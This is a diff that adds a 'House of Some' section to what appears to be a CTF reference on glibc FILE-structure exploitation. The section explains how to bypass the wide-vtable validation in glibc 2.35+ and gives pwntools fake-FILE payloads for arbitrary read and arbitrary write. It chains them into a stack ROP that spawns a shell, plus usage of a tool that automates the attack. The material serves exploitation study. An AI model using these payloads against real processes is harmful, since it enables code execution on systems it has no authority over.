@@ -10,6 +10,7 @@ FILE-structure (_IO_FILE) exploitation for libc 2.23-2.27+: fastbin→stdout vta
 - [Unsorted Bin Corruption via mp_ Structure (HITCON 2017)](#unsorted-bin-corruption-via-mp_-structure-hitcon-2017)
 - [realloc(ptr, 0) as free() for UAF (AceBear 2018)](#reallocptr-0-as-free-for-uaf-acebear-2018)
 - [Single-Byte Reference Counter Wraparound to UAF (WhiteHat Grand Prix 2018)](#single-byte-reference-counter-wraparound-to-uaf-whitehat-grand-prix-2018)
+- [House of Some — Wide-Vtable Check Bypass via a Legit `_IO_file_jumps` Slot (Csome, 2023)](#house-of-some--wide-vtable-check-bypass-via-a-legit-_io_file_jumps-slot-csome-2023)
 
 ---
 
@@ -277,3 +278,116 @@ struct Book {
 **Key insight:** Any counter that guards lifetime must be wide enough to exceed the number of handles the program can create in one session. `uint8_t` refcounts are always a red flag — verify that the `addref` path either saturates (stays at 255) or uses a wider type. The exploit only needs 256 `addref` calls and one extra `release`, so even heavily rate-limited handle APIs remain reachable.
 
 **References:** WhiteHat Grand Prix 2018 — writeup 10809
+
+---
+
+## House of Some — Wide-Vtable Check Bypass via a Legit `_IO_file_jumps` Slot (Csome, 2023)
+
+**Pattern:** House of Apple 2 ends in `(*(_wide_data->_wide_vtable + 0x68))(fp)` - an arbitrary function pointer that hardened builds validate (vtable range/`_IO_vtable_check` on `_wide_data`), which retires the chain there. House of Some keeps the identical call path but makes that slot resolve to a **legitimate** entry: set `_wide_data->_wide_vtable = _IO_file_jumps - 0x48`, so `+0x68` lands on `_IO_file_jumps + 0x20`, i.e. the `__underflow` slot = `_IO_new_file_underflow`. Nothing points outside a real jump table, so validation passes.
+
+Why `_IO_new_file_underflow` is the useful landing site - it ends with
+
+```c
+count = _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);
+```
+
+which is `read (fp->_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base)`: **all three arguments come from the fake FILE** - an arbitrary-address write primitive keyed by fd.
+
+### Requirements
+
+1. libc base known;
+2. a controlled, writable, known address for the fake FILE(s);
+3. one libc write of a controlled pointer, normally `_IO_list_all = fake_file`;
+4. the program exits normally or calls `exit()` (that is what reaches `_IO_flush_all`).
+
+### Trigger chain
+
+```
+exit() -> __run_exit_handlers -> _IO_flush_all
+  for (fp = _IO_list_all; fp; fp = fp->_chain) {
+    if ((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) ||
+        (fp->_vtable_offset == 0 && fp->_mode > 0 &&
+         fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))
+        _IO_OVERFLOW (fp, EOF);          /* vtable = _IO_wfile_jumps */
+  }
+      _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE (fp)
+          (*(_wide_vtable + 0x68)) (fp)  /* == _IO_new_file_underflow */
+              read (_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base)
+```
+
+### Fake FILE: arbitrary write
+
+```python
+fake_file_read = flat({
+    0x00: 0,                      # _flags
+    0x20: 0,                      # _IO_write_base
+    0x28: 0,                      # _IO_write_ptr
+    0x38: buf_start,              # _IO_buf_base -> read() destination
+    0x40: buf_end,                # _IO_buf_end  -> read() length
+    0x68: chain,                  # next fake FILE
+    0x70: fileno,                 # 0 = stdin
+    0x82: b"\x00",                 # _vtable_offset = 0
+    0x88: zero_addr,              # _IO_save_base: keep 0 so the backup-buffer free path cannot fire
+    0xa0: wide_data,              # _wide_data
+    0xc0: 2,                      # _mode > 0
+    0xd8: libc.sym['_IO_wfile_jumps'],
+}, filler=b"\x00")
+
+fake_wide_data = flat({
+    0x18: 0,                      # _IO_write_base
+    0x20: 1,                      # _IO_write_ptr > write_base
+    0x30: 0,                      # _IO_buf_base = NULL -> _IO_WDOALLOCATE runs
+    0xe0: libc.sym['_IO_file_jumps'] - 0x48,   # _wide_vtable -> __underflow slot
+}, filler=b"\x00")
+```
+
+### Fake FILE: arbitrary read (leak)
+
+Switch the FILE vtable back to `_IO_file_jumps` so `_IO_flush_all` calls `_IO_new_file_overflow` -> `write (fileno, _IO_write_base, _IO_write_ptr - _IO_write_base)`:
+
+```python
+fake_file_write = flat({
+    0x00: 0x800 | 0x1000 | 0x8000,   # _flags
+    0x20: buf_start,                 # _IO_write_base -> write() source
+    0x28: buf_end,                   # _IO_write_ptr
+    0x68: chain,
+    0x70: 1,                         # stdout
+    0xd8: libc.sym['_IO_file_jumps'],
+}, filler=b"\x00")
+```
+
+### Chaining into stack ROP
+
+`_chain` is the original FSOP idea brought back: `_IO_flush_all` walks the list and fires every fake FILE, so a single `exit()` gives read -> write -> read. The canonical three stages:
+
+1. fake #1 (`_IO_file_jumps`): read `environ` -> stack leak;
+2. fake #2 (`_IO_wfile_jumps`): `read (0, stack_target, len)` - overwrite a saved return address on the stack (or rebuild fake #3 there);
+3. when the flush returns, the overwritten return address runs the ROP chain. No stack pivot needed.
+
+### Automation: `SomeofHouse` (installed at `/root/Some-of-House/SomeofHouse.py`)
+
+```python
+from SomeofHouse import HouseOfSome
+
+hos = HouseOfSome(libc=libc, controlled_addr=fake_file_start)   # zero_addr defaults to _environ - 0x10
+payload = hos.write(1, libc.sym['environ'], 8)     # arbitrary-read fake FILE (leak)
+payload = hos.read(0, target, 0x400)               # arbitrary-write fake FILE
+hos.bomb(io)                                       # full chain: ROP execve('/bin/sh')
+hos.bomb_orw(io, b'/flag')                         # seccomp: open/read/write
+hos.bomb_shellcode(io, shellcode)                  # custom shellcode
+hos.bomb_raw(io)                                   # returns the leaked stack address, you send the ROP
+```
+
+Every variant assumes `_IO_list_all` already points into your controlled area; the library extends the list through `_chain`. `stack_view(leak_bytes)` pretty-prints a leaked stack window, and `HouseLibc(libc).find__IO_wfile_jumps_maybe_mmap()` locates the jumps table in a stripped libc.
+
+### House of Some 2 (printf/puts variant)
+
+When the program only has `printf`/`puts` and no exit path, the sibling chain drives `_IO_wfile_jumps_maybe_mmap` -> `_IO_wfile_underflow_maybe_mmap` -> `_IO_file_underflow_maybe_mmap` -> `decide_maybe_mmap` (which restores both vtables after its `_IO_SYSSTAT` call), then `_IO_UNDERFLOW` and `_IO_WUNDERFLOW`. The first pass's `read()` rewrites the fake FILE itself (regaining control of the vtable) and sets `rdx` for the next pass; the second pass points `_IO_SYSSTAT` at a write-style function and lands on the stack. `decide_maybe_mmap` has a stack canary, so a stack leak is required first - exactly what a House of Some pass provides.
+
+### Version notes
+
+- Works on 2.35 and later (the reference writeups run it on 2.35 through 2.43); it only relies on the `_IO_wfile_jumps` / `_IO_file_jumps` layout, which is stable across that range.
+- This is the practical replacement for the hook-based paths: `__free_hook` / `__malloc_hook` have been gone since 2.34, and it also survives the `_wide_vtable` validation that breaks House of Apple 2.
+- Needs an exit path. If the process never exits, pair it with House of Some 2 or reach `_IO_flush_all` through any `exit`/`abort`/`__libc_fatal` path.
+
+**References:** Csome, [House of some](https://blog.csome.cc/p/house-of-some/) (2023-11) and [House of Some 2](https://blog.csome.cc/p/house-of-some-2/) (2024-01); [zer00ne walkthrough with a full exploit](https://khighl.github.io/2025/05/15/house%20of%20some/); tool: CsomePro/Some-of-House (`SomeofHouse.py`, installed locally under `/root/Some-of-House`).
